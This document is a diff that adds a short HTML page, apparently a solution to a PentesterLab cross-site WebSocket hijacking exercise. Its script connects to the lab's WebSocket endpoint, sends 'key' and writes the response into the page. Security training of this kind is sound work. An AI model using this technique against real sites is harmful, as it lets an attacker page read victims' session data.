@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    Jai Sri Rma
+</head>
+<body>
+    <script>
+       var ws=new WebSocket("ws://ptl-eb66bcc7-e3e09b4b.libcurl.so/pentesterlab");
+       ws.onmessage=function(message){
+        document.write(message.data);
+       } 
+       ws.onopen=() => ws.send("key");
+    </script>
+</body>
+</html>
